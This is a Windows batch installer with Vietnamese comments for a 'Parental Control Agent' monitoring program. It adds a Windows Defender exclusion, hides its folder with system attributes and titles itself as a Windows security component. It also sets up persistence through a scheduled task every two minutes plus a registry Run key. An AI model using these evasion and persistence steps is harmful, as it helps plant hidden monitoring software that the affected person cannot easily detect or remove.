@echo off
:: PARENTAL CONTROL AGENT - SMART AUTO INSTALLER
:: Chi can chay file nay 1 lan duy nhat (Run as administrator)
chcp 65001 > nul
color 0A
title WINDOWS SECURITY COMPONENT INSTALLER

:: Kiem tra quyen Admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Vui long chuot phai chon 'Run as administrator'!
    pause
    exit /b
)

set TARGET_DIR=C:\ProgramData\ParentalControl
set "SCRIPT_DIR=%~dp0"

echo.
echo ============================================================
echo   PARENTAL CONTROL AGENT - SMART INSTALLER
echo ============================================================
echo.

:: Dung tien trinh cu
echo [1/6] Dang dung chuong trinh cu (neu dang chay)...
taskkill /f /t /im ParentalControlAgent.exe >nul 2>&1
taskkill /f /t /im ParentalControlWatchdog.exe >nul 2>&1
taskkill /f /t /im ParentalControlAgent_Debug.exe >nul 2>&1
timeout /t 2 /nobreak >nul

:: Xoa task cu
echo [2/6] Xoa Task Scheduler cu...
schtasks /delete /tn "ParentalControlSystem" /f >nul 2>&1
schtasks /delete /tn "ParentalControlAgentTask" /f >nul 2>&1
schtasks /delete /tn "WindowsSecurityAgent" /f >nul 2>&1
schtasks /delete /tn "ParentalControlWatchdogTask" /f >nul 2>&1
timeout /t 1 /nobreak >nul

:: Tao thu muc dich & Them ngoai le Windows Defender
echo [3/6] Tao thu muc cai dat & cau hinh ngoai le Windows Defender...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
if exist "%TARGET_DIR%\shutdown.flag" del /f /q "%TARGET_DIR%\shutdown.flag" >nul 2>&1
if exist "%APPDATA%\ParentalControl\shutdown.flag" del /f /q "%APPDATA%\ParentalControl\shutdown.flag" >nul 2>&1
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1

:: Tim va copy file EXE tu dung vi tri
echo [4/6] Dang sao chep chuong trinh...

:: Thu 1: Cung thu muc voi file BAT nay
if exist "%SCRIPT_DIR%ParentalControlAgent.exe" (
    echo     Tim thay EXE trong cung thu muc...
    copy /y "%SCRIPT_DIR%ParentalControlAgent.exe" "%TARGET_DIR%\ParentalControlAgent.exe" >nul
    copy /y "%SCRIPT_DIR%ParentalControlWatchdog.exe" "%TARGET_DIR%\ParentalControlWatchdog.exe" >nul
    goto :files_copied
)

:: Thu 2: Thu muc con ParentalControlAgent\
if exist "%SCRIPT_DIR%ParentalControlAgent\ParentalControlAgent.exe" (
    echo     Tim thay EXE trong thu muc con ParentalControlAgent\...
    xcopy /E /Y /I "%SCRIPT_DIR%ParentalControlAgent\*" "%TARGET_DIR%\" >nul
    goto :files_copied
)

:: Thu 3: Thu muc dist\
if exist "%SCRIPT_DIR%dist\ParentalControlAgent.exe" (
    echo     Tim thay EXE trong dist\...
    xcopy /E /Y /I "%SCRIPT_DIR%dist\*" "%TARGET_DIR%\" >nul
    goto :files_copied
)

echo [!] KHONG TIM THAY ParentalControlAgent.exe!
echo     Vui long dat file BAT nay cung thu muc voi ParentalControlAgent.exe
pause
exit /b 1

:files_copied
echo     Sao chep thanh cong!

:: An thu muc
echo [5/6] Cau hinh bao mat he thong...
attrib +h +s "%TARGET_DIR%" >nul 2>&1

set "START_EXE=%TARGET_DIR%\ParentalControlWatchdog.exe"
if not exist "%START_EXE%" set "START_EXE=%TARGET_DIR%\ParentalControlAgent.exe"

:: Dang ky Task Scheduler + Registry bang PowerShell (battery-safe, AtLogOn)
:: Dung Register-ScheduledTask vi schtasks mac dinh DisallowStartIfOnBatteries=True
:: va /sc onstart chay duoi SYSTEM khong doc duoc DPAPI credentials.
echo [6/6] Dang ky khoi dong tu dong (AtLogOn, battery-safe)...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='Stop';" ^
  "$a=New-ScheduledTaskAction -Execute '%START_EXE%';" ^
  "$tLogon=New-ScheduledTaskTrigger -AtLogOn;" ^
  "$tRep=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 2);" ^
  "$who='%USERDOMAIN%\%USERNAME%';" ^
  "$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -ExecutionTimeLimit (New-TimeSpan -Minutes 0);" ^
  "$ok=$false;" ^
  "foreach($lvl in 'Highest','Limited'){" ^
  "  try{" ^
  "    $p=New-ScheduledTaskPrincipal -UserId $who -LogonType Interactive -RunLevel $lvl;" ^
  "    Register-ScheduledTask -TaskName 'ParentalControlWatchdogTask' -Action $a -Trigger $tLogon,$tRep -Principal $p -Settings $s -Force -ErrorAction Stop | Out-Null;" ^
  "    $ok=$true; Write-Host ('    task ok (RunLevel '+$lvl+')'); break" ^
  "  }catch{ Write-Host ('    RunLevel '+$lvl+' fail: '+$_.Exception.Message) }" ^
  "};" ^
  "if(-not $ok){ exit 1 }"
if errorlevel 1 (
    echo [!] Khong tao duoc Scheduled Task bang PowerShell.
)

:: Registry Run (chay khi dang nhap - du phong)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ParentalControlAgent" /t REG_SZ /d "\"%START_EXE%\"" /f >nul 2>&1

:: Khoi chay ngay lap tuc
echo [6/6] Dang khoi chay Agent Supervisor...
if exist "%START_EXE%" (
    start "" "%START_EXE%"
    echo     Agent Supervisor da khoi dong!
) else (
    echo [!] Loi: Khong tim thay EXE tai %TARGET_DIR%
    pause
    exit /b 1
)

echo.
echo ============================================================
echo   CAI DAT HOAN TAT THANH CONG!
echo   Agent dang chay ngam va se tu dong bat khi dang nhap.
echo ============================================================
echo.
timeout /t 5 /nobreak >nul
exit /b 0
